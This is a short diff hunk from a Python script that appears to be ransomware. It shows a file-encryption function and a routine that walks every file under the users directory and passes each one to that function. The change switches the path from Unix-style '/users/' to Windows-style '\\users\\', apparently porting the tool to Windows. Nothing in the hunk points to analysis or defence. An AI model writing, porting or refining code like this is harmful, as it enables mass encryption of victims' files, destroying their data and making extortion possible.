@@ -29,7 +29,7 @@ def file_ecrypt(key, name):
             pass
 # LIST ALL FILES EXTENSIONS AND INVOKE ENCRYPTION FUNCTION
 def filelist():
-    rep = ['/users/']
+    rep = ['\\users\\']
     for user in rep:
         for root, dirs, files in os.walk(user):
             for file in files:
